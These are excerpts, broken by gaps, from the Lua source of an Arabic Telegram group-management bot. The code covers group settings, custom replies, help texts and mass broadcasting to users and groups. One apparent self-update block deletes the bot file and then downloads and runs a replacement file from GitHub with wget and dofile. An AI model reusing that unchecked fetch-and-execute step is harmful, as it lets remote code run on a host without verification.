if msg.content_.photo_ then
if DevRio:get(ARAY..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevRio:del(ARAY..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"↯︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevRio:del(ARAY..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(ARAY..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source ARAY     --
...
if data.ID == "Ok" then
DevRio:del(ARAY..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevRio:get(ARAY..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevRio:del(ARAY..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevRio:scard(ARAY.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevRio:scard(ARAY.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(ARAY.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(ARAY.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(ARAY.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(ARAY.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(ARAY.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(ARAY.."Rio:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/sxj3z' end
...
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "sxj3z")..")"
else 
...
ChatLeave(dp.id_, ARAY)
DevRio:srem(ARAY.."Rio:Groups", dp.id_)
else
...
DevRio:set(ARAY..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:FreeBot'..ARAY) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:FreeBot'..ARAY,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source ARAY     --
...
ReplyStatus(msg,result.id_,"ReplyBy","↯︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(ARAY.."Rio:Groups",msg.chat_id_)
if not DevRio:get(ARAY..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(ARAY..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(ARAY..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(ARAY..'Rio:Groups',msg.chat_id_) then
...
local Text = "↯︙Source ARAY\n↯︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(ARAY.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(ARAY.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(ARAY.."Rio:Groups:Links" ..v)
...
DevRio:setex(ARAY.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(ARAY.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(ARAY.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(ARAY..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevRio:setex(ARAY.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(ARAY.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(ARAY.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(ARAY..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevRio:setex(ARAY.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙ارسل الرساله الان لتوجيها \n↯︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(ARAY.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(ARAY.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(ARAY..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevRio:setex(ARAY.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙ارسل الرساله الان لتوجيها \n↯︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(ARAY.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(ARAY.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(ARAY..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم اذاعة رسالتك بالتوجيه \n↯︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevRio:setex(ARAY.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(ARAY.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(ARAY.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(ARAY.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(ARAY..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevRio:get(ARAY..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevRio:smembers(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevRio:set(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevRio:sismember(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevRio:set(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(ARAY..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevRio:set(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevRio:set(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(ARAY..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source ARAY     --
...
local List = DevRio:smembers(ARAY..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(ARAY..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(ARAY..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(ARAY..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source ARAY     --
...
local List = DevRio:smembers(ARAY.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n↯︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevRio:set(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(ARAY.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(ARAY.."Rio:Sudo:AllRed",text)
DevRio:set(ARAY.."DelSudoRep",text)
return false 
end end
--     Source ARAY     --
...
local redod = DevRio:smembers(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '↯︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevRio:smembers(ARAY..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevRio:get(ARAY..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevRio:del(ARAY..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevRio:smembers(ARAY..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '↯︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(ARAY.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevRio:get(ARAY.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevRio:get(ARAY.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevRio:get(ARAY.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevRio:get(ARAY.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevRio:get(ARAY.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevRio:get(ARAY.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevRio:get(ARAY.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevRio:del(ARAY..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(ARAY..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevRio:smembers(ARAY.."Rio:Sudo:AllRed")
MsgRep = '↯︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(ARAY.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevRio:get(ARAY.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevRio:get(ARAY.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevRio:get(ARAY.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevRio:get(ARAY.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevRio:get(ARAY.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevRio:get(ARAY.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevRio:get(ARAY.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevRio:del(ARAY.."Rio:Add:AllRed"..v)
DevRio:del(ARAY.."Rio:Gif:AllRed"..v)
DevRio:del(ARAY.."Rio:Voice:AllRed"..v)
DevRio:del(ARAY.."Rio:Audio:AllRed"..v)
DevRio:del(ARAY.."Rio:Photo:AllRed"..v)
DevRio:del(ARAY.."Rio:Stecker:AllRed"..v)
DevRio:del(ARAY.."Rio:Video:AllRed"..v)
DevRio:del(ARAY.."Rio:File:AllRed"..v)
DevRio:del(ARAY.."Rio:Text:AllRed"..v)
DevRio:del(ARAY.."Rio:Sudo:AllRed")
end
...
DevRio:set(ARAY..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevRio:set(ARAY..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help0'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help01'..msg.sender_user_id_)
if ARAYTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help21'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help31'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help41'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help51'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(ARAY..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local ARAYTeam =  DevRio:get(ARAY..'Rio:Help61'..msg.sender_user_id_)
if ARAYTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(ARAY..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
os.execute('rm -rf ARAY.lua') 
os.execute('wget https://raw.githubusercontent.com/ARAYTeam/David/master/ARAY.lua') 
dofile('ARAY.lua') 
...
local Users = DevRio:smembers(ARAY.."User_Bot")
local Groups = DevRio:smembers(ARAY..'Chek:Groups')
local Sudos = DevRio:smembers(ARAY.."Sudo:User")
if DevRio:get(ARAY..'Name:Bot') then
DevRio:set(ARAY..'Rio:NameBot',(DevRio:get(ARAY..'Name:Bot') or 'روتانا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(ARAY..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(ARAY..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(ARAY..'Rio:Groups',Groups[i]) 
if DevRio:get(ARAY.."Private:Group:Link"..Groups[i]) then
DevRio:set(ARAY.."Rio:Groups:Links"..Groups[i],DevRio:get(ARAY.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(ARAY.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(ARAY..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(ARAY.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(ARAY..'Constructor'..Groups[i])
